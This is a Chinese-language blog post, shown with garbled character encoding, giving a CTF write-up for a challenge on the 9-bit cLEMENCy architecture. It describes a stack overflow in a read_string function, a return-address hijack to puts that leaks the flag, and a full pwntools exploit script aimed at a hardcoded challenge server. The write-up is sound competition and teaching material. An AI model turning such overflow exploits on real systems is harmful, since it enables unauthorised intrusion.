<!DOCTYPE html>
<html>

<head>
  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
  <title>Pwnhub çº¿ä¸‹æ²™é¾™CTFä¹‹cLEMENCyé¢˜è§£ | æ˜Ÿåšçš„Blog</title>
  <meta name="description" content="Pwnerçš„è‡ªæˆ‘ä¿®å…»" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="MobileOptimized" content="320" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
  <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Noto+Serif:400,700,400italic|Open+Sans:700,400" />

  <meta name="generator" content="æ˜Ÿåšçš„Blog">

  
  
  <link rel="alternate" type="application/atom+xml" title="Atom 0.3" href="atom.xml">
  
  

  
</head>


<body class="post-template">

  <header class="site-head"  style="background-image: url(/images/Blog-banner.jpg)" >
    <div class="vertical">
        <div class="site-head-content inner">
             <a class="blog-logo" href="/"><img src="/images/avatar.jpg" alt="Blog Logo"/></a> 
            <h1 class="blog-title">æ˜Ÿåšçš„Blog</h1>
            <h2 class="blog-description">Pwnerçš„è‡ªæˆ‘ä¿®å…»</h2>
        </div>
    </div>
</header>
  

<main class="content" role="main">
  <article class="post">
    <span class="post-meta">
      <time datetime="2017-08-14T07:27:12.000Z" itemprop="datePublished">
          2017-08-14
      </time>
    
    
    | 
    <a href='/tags/Pwn/'>Pwn</a>,
    
    <a href='/tags/CTF/'>CTF</a>
    
    
</span>
    <h1 class="post-title">Pwnhub çº¿ä¸‹æ²™é¾™CTFä¹‹cLEMENCyé¢˜è§£</h1>
    <section class="post-content">
      <p>8æœˆ12æ—¥Pwnhubç¬¬ä¸€æ¬¡æ²™é¾™ï¼Œå¿ƒæƒ³åˆ°è¦å’Œä¸€ä¼—å¤§ä½¬é¢åŸºï¼Œå¿ƒæƒ…å¼‚å¸¸æ¿€åŠ¨ï¼Œäºæ˜¯æ”¥ç€è®¨æ¥çš„é‚€è¯·å‡½ï¼Œå†’ç€12çº§å¤§é›¨ï¼Œæ»¡å¿ƒæ¬¢å–œçš„èµ¶åˆ°äº†äº”ç¯çš„å°åˆ«å¢…~</p>
<p>ä¸Šåˆçš„è®®é¢˜å¹²è´§æ»¡æ»¡ï¼Œæœ‰å† åŸå¤§ä½¬ï¼Œ360å°å§å§å’Œé’åšå­¦å¼Ÿflyyyçš„åˆ†äº«ï¼Œä¸­åˆçš„<strong>çƒ§çƒ¤ + å¾·å·æ‰‘å…‹</strong>ä¹‹åä¾¿æ˜¯Pwnhubçš„ç»å…¸é¡¹ç›®CTFï¼Œå…¶ä¸­Explorerå¤§ä½¬å‡ºäº†ä¸€é“<code>cLEMENCy</code>æ¶æ„çš„é¢˜ç›®ã€‚</p>
<p>æåˆ°<code>cLEMENCy</code>å°±ä¸å¾—ä¸æåˆ°åˆšè¿‡å»çš„<code>Defcon 25 Final</code>ã€‚ä¸å»å¹´çš„CGCä¸åŒï¼Œ<code>Defcon Final</code>ä»Šå¹´çš„è§„åˆ™æ˜¯ï¼Œä¸»åŠæ–¹ä¸æ¯”èµ›å‰ä¸€å¤©24å°æ—¶æ”¾å‡ºè‡ªå®šä¹‰æ¶æ„ï¼Œä»¥åŠç›¸åº”çš„<code>emulator</code>ï¼Œç•™ç»™å‚èµ›è€…24å°æ—¶çš„å‡†å¤‡æ—¶é—´ã€‚è¿™æ ·ä¸€æ¥ï¼Œæ‰€æœ‰çš„å‚èµ›é˜Ÿéƒ½ç«™åœ¨äº†åŒä¸€èµ·è·‘çº¿ä¸Šï¼Œéœ€è¦ä»0å‡†å¤‡æ‰€æœ‰çš„å·¥å…·ã€‚</p>
<h2 id="0x01-ç®€ä»‹ï¼š9bitçš„å¥‡æ€ªæ¶æ„"><a href="#0x01-ç®€ä»‹ï¼š9bitçš„å¥‡æ€ªæ¶æ„" class="headerlink" title="0x01 ç®€ä»‹ï¼š9bitçš„å¥‡æ€ªæ¶æ„"></a>0x01 ç®€ä»‹ï¼š9bitçš„å¥‡æ€ªæ¶æ„</h2><p><code>cLEMENCyï¼ˆthe LEgitbs Middle ENdian Computer architectureï¼‰</code>ç”±LBSçš„lightingç­‰å¤§ä½¬ä»¬è®¾è®¡ã€‚<code>cLEMENCy</code>çš„æŒ‡ä»¤æ‰‹å†Œä¸­ç»™å‡ºäº†æ¶æ„çš„æ‰€æœ‰ç»†èŠ‚ã€‚ç®€å•çš„æ€»ç»“å¦‚ä¸‹ï¼š</p>
<ol>
<li><p>æ¯å­—èŠ‚ç”±9bitç»„æˆï¼›ä½¿ç”¨æ··åˆåºå­˜å‚¨ï¼ŒRegister XXYYZZ â†’ Memory YYXXZZï¼ŒRegister XXYY â†’ Memory YYXX</p>
<blockquote>
<p>â€œEach byte is 9 bits of data, bit 0 is the left most significant bit. Middle-Endian data stores bits 9 to 17, followed by bits 0 to 8, then bits 18 to 27 in memory when handling three bytes. Two bytes of data will have bits 9-17 then bits 0 to 8 written to memory.â€</p>
</blockquote>
</li>
<li><p>å†…å­˜å¸ƒå±€ï¼šå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚æ¼æ´åˆ©ç”¨çš„ç›®æ ‡å³æŠŠFlagé¡µé¢å¼€å§‹çš„ä¸€æ®µå†…å­˜ï¼Œå³flagæ‰“å°å‡ºæ¥ã€‚æ‰€ä»¥è¯´åªéœ€è¦ä»»æ„åœ°å€è¯»å°±å¯ä»¥äº†ã€‚</p>
<p> <img src="https://ws3.sinaimg.cn/large/006tNc79gy1fija68reuoj310y0hkn1b.jpg" alt=""></p>
</li>
<li><p>æŒ‡ä»¤é›†ï¼šcLEMENCyæ˜¯RISCï¼Œä¸è¿‡æœ€é•¿54bitï¼ŒæŒ‡ä»¤é›†å’Œarmæœ‰ç‚¹ç±»ä¼¼ï¼›</p>
</li>
<li><p>å¯„å­˜å™¨ï¼šå…±31ä¸ªå¯„å­˜å™¨ï¼Œ<code>R0</code>ä¸€èˆ¬ç”¨äº<code>param 1</code>å’Œ<code>ret value</code>ï¼Œ<code>ST</code>è¡¨ç¤ºæ ˆï¼Œ<code>RA</code>è¡¨ç¤ºè¿”å›åœ°å€ã€‚</p>
</li>
<li><p>æ ˆè°ƒç”¨ï¼šæ ˆæœ‰ä¸¤ä¸ªå¢é•¿æ–¹å‘ï¼›å¯¹æ ˆçš„æ“ä½œå¾€å¾€é€šè¿‡<code>STT(Store Tri)</code>æŒ‡ä»¤å®ç°ã€‚<code>STTm</code>æŒ‡ä»¤æœ‰ä¸‰ç§ï¼Œå…¶ä¸­0ï¼Œ1ï¼Œ2åˆ†åˆ«è¡¨ç¤ºå†…å®¹å­˜å…¥memoryä¹‹å<code>rB</code>æ“ä½œæ•°æ˜¯å¢åŠ è¿˜æ˜¯å‡å°‘ï¼Œä»è€Œè¡¨ç¤ºæ ˆçš„å¢é•¿æ–¹å‘ã€‚</p>
</li>
</ol>
<p>é™¤æ­¤ä¹‹å¤–ï¼Œæ¯”èµ›ä¸­ä½¿ç”¨çš„bianryä½¿ç”¨äº†<code>neatlibc</code>ï¼Œä½†ä¸ºäº†æ–¹ä¾¿æ¨¡æ‹Ÿå™¨å¯¹ioå’Œå†…å­˜ç®¡ç†è¿›è¡Œäº†ä¸€äº›ä¿®æ”¹ã€‚</p>
<h2 id="0x02-æ¼æ´åˆ©ç”¨ï¼šRet2Put"><a href="#0x02-æ¼æ´åˆ©ç”¨ï¼šRet2Put" class="headerlink" title="0x02 æ¼æ´åˆ©ç”¨ï¼šRet2Put"></a>0x02 æ¼æ´åˆ©ç”¨ï¼šRet2Put</h2><p>æ—¢ç„¶æ˜¯2ä¸ªå°æ—¶çš„CTFï¼Œå¤§ä½¬ä»¬å‡ºé¢˜è‚¯å®šæ˜¯æ”¾è¶³äº†æ°´233ã€‚ç”¨IDAå¤§æ¦‚åˆ†æä¸€ä¸‹ï¼Œå¯ä»¥å‘ç°è¿™æ˜¯ä¸€ä¸ªç®€å•çš„ä¼ª<code>&quot;Base64&quot;</code>ã€‚</p>
<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fijbgetydzj312w0ocdoa.jpg" alt=""></p>
<blockquote>
<p>è¿™é‡Œç”¨çš„æ˜¯<code>Tea Deliverers</code>åœ¨æ¯”èµ›æ—¶ä½¿ç”¨çš„<code>IDA Processor</code>ï¼ˆè†œLYMå’ŒExplorerå’ŒGYCç­‰å¤§ä½¬ï¼‰ã€‚PPPåœ¨èµ›åä¹Ÿæ”¾å‡ºäº†ä»–ä»¬æ¯”èµ›æ—¶ä½¿ç”¨çš„<a href="https://github.com/pwning/defcon25-public" target="_blank" rel="external">Utils</a>ã€‚</p>
</blockquote>
<p>å…¶ä¸­ä¸»è¦çš„å‡½æ•°<code>read_string</code>:è¾“å…¥ä¸€ä¸ª9bitè¡¨ç¤ºçš„å­—ç¬¦ä¸²ï¼ˆäº¤äº’ä¹Ÿå…¨éƒ¨éƒ½æ˜¯åŸºäº9bitï¼‰ï¼Œä¹‹åä¼šä»¥ä¸‰å­—èŠ‚ä¸ºå•ä½ï¼Œè½¬æˆä»¥ä¸‰å­—èŠ‚ä¸ºå•ä½çš„å€¼ã€‚å¦‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;AAA\n&apos; -&gt; 0010101</div></pre></td></tr></table></figure></p>
<p>åœ¨è°ƒç”¨è¿™ä¸ªå‡½æ•°æ—¶ï¼Œä¼ å…¥çš„lenè¿‡é•¿ï¼Œäºæ˜¯å¯ä»¥æº¢å‡ºä¸Šä¸€ä¸ªå‡½æ•°çš„è¿”å›åœ°å€ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç›´æ¥<code>Ret2put</code>ï¼Œå³ä¿®æ”¹è¿”å›åœ°å€å’Œå‚æ•°ä¸º<code>Put</code>å‡½æ•°å’Œ<code>flag page</code>çš„åœ°å€ï¼Œå³å¯æ‰“å°å‡ºflagã€‚</p>
<p>è§‚å¯Ÿmain_funcè¿”å›å¤„ï¼Œ<code>LDT R28-RA, [R28 + 0]</code>å°†R28, ST, RAä¸‰ä¸ªå¯„å­˜å™¨èµ‹å€¼ï¼Œæ˜¯å¯æ§çš„ï¼Œè€Œputsçš„å‚æ•°R0ä¹Ÿé€šè¿‡<code>ad. R0, R28, R27</code>æ§åˆ¶ã€‚</p>
<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fijbr5ncb1j30kx0euq7p.jpg" alt=""></p>
<p>äºæ˜¯æ„é€ å¯¹åº”å€¼å³å¯ã€‚</p>
<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fijc2pzv9uj30iq068gnz.jpg" alt=""></p>
<p>è¿˜æœ‰ä¸€ç‚¹æ˜¯ï¼ŒSTè¦å¡«ä¸Šä¸€ä¸ªåˆæ³•å€¼ï¼Œå¦åˆ™<code>puts</code>æ—¶ä¼š<code>crash</code>ã€‚ä½†æ˜¯ç¨‹åºæ˜¯æ²¡æœ‰éšæœºåŒ–çš„ï¼Œæ‰€ä»¥æ¯æ¬¡è¿è¡Œéƒ½ä¸€æ ·ã€‚è¿™ä¹Ÿå¯¼è‡´äº†æ¯”èµ›æ—¶â€æŠ„ä½œä¸š(ç›´æ¥é‡æ”¾)â€å¼‚å¸¸æ–¹ä¾¿233</p>
<p>æœ€ç»ˆä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">import string</div><div class="line"></div><div class="line">def p27(bit24):</div><div class="line">    r = bin(bit24)[2:].rjust(27, &apos;0&apos;)</div><div class="line">    r = r[9:18] + r[0:9] + r[18:27]</div><div class="line">    return r</div><div class="line"></div><div class="line"></div><div class="line">def sb8tosb9(payload):</div><div class="line">    stream = &apos;&apos;.join(bin(ord(x))[2:].rjust(9, &apos;0&apos;) for x in payload)</div><div class="line">    pad = len(stream) % 8</div><div class="line">    if pad != 0:</div><div class="line">        length = len(stream) + (8 - pad)</div><div class="line">    else:</div><div class="line">        length = len(stream)</div><div class="line">    stream = stream.ljust(length, &apos;0&apos;)</div><div class="line">    payload9 = &apos;&apos;.join(</div><div class="line">        chr(int(stream[i:i + 8], 2)) for i in range(0, len(stream), 8))</div><div class="line">    return payload9</div><div class="line"></div><div class="line">def sb9tosb8(payload):</div><div class="line">    stream = &apos;&apos;.join(bin(ord(x))[2:].rjust(8, &apos;0&apos;) for x in payload)</div><div class="line">    length = (len(stream) / 9) * 9</div><div class="line">    stream = stream[:length]</div><div class="line">    return &apos;&apos;.join(</div><div class="line">        chr(int(stream[i:i + 9], 2)) for i in range(0, len(stream), 9))</div><div class="line"></div><div class="line">alphabet = &apos;&apos;</div><div class="line">for i in range(26):</div><div class="line">    alphabet += (chr(i + ord(&apos;A&apos;)))</div><div class="line">for i in range(26):</div><div class="line">    alphabet += (chr(i + ord(&apos;a&apos;)))</div><div class="line">for i in range(10):</div><div class="line">    alphabet += (chr(i + ord(&apos;0&apos;)))</div><div class="line">alphabet += &apos;+/&apos;</div><div class="line">def conventer(bit18):</div><div class="line">    res = &apos;&apos;</div><div class="line">    res += alphabet[int(&quot;0b&quot; + bit18[:6],2)]</div><div class="line">    res += alphabet[int(&quot;0b&quot; + bit18[6:12],2)]</div><div class="line">    res += alphabet[int(&quot;0b&quot; + bit18[-6:],2)]</div><div class="line">    return res</div><div class="line"></div><div class="line"></div><div class="line">p = remote(&quot;54.223.103.62&quot;,10000)</div><div class="line">flag_addr = 0x4010000 + 0x21</div><div class="line">pc_addr = 0x645F</div><div class="line">newpld = 11 * p27(0x414141) + p27(flag_addr) + p27(0x3fffbc7) + p27(pc_addr)</div><div class="line">payload = &apos;&apos;</div><div class="line">for i in range(len(newpld) / 18):</div><div class="line">    payload += conventer(newpld[i*18:(i+1)*18])</div><div class="line">p.send(sb8tosb9(payload + &apos;\n&apos;))</div><div class="line">p.recvn(0x2d)</div><div class="line">data = sb9tosb8(p.recvall(timeout = 1))</div><div class="line">print data</div></pre></td></tr></table></figure>
<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fijbzy7fl3j30c7014t91.jpg" alt=""></p>

    </section>
    <footer class="post-footer">
      <section class="author">
    <h4>cxm</h4>
    <p>æ˜Ÿåšçš„blogï¼Œå¿ƒæ„¿æ˜¯æ—©æ—¥æ¯•ä¸š</p>
</section>
      <section class="share">
    <h4>Share this post</h4>
    <a class="icon-twitter" href="http://twitter.com/share?url=https://windcarp.github.io/2017/08/14/Writeup/"
       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
        <span class="hidden">Twitter</span>
    </a>
    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://windcarp.github.io/2017/08/14/Writeup/"
       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
        <span class="hidden">Facebook</span>
    </a>
    <a class="icon-google-plus" href="https://plus.google.com/share?url=https://windcarp.github.io/2017/08/14/Writeup/"
       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
        <span class="hidden">Google+</span>
    </a>
</section>
    </footer>
  </article>
  <nav class="pagination" role="pagination">
    
    <a class="newer-posts" href="/2017/09/27/Academic_share/">
        â† è®ºæ–‡é˜…è¯»åˆ†äº«
    </a>
    
    <span class="page-number">â€¢</span>
    
    <a class="older-posts" href="/2016/12/27/Test-Blog/">
        Pwn500ï¼šshrink the chunk(LCTF 2016) â†’
    </a>
    
</nav>
  <div id="comment" class="comments-area">
    <h1 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h1>

    
</div>
</main>


  
<footer class="site-footer">
  
  <a class="subscribe icon-feed" href="atom.xml"><span class="tooltip">Subscribe!</span></a>
  
  <div class="inner">
     <section class="copyright">All content copyright <a href="/">æ˜Ÿåšçš„Blog</a> &copy; 2014 &bull; All rights reserved.</section>
     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
  </div>
</footer>

  <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>

<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/js/index.js"></script>






</body>
</html>
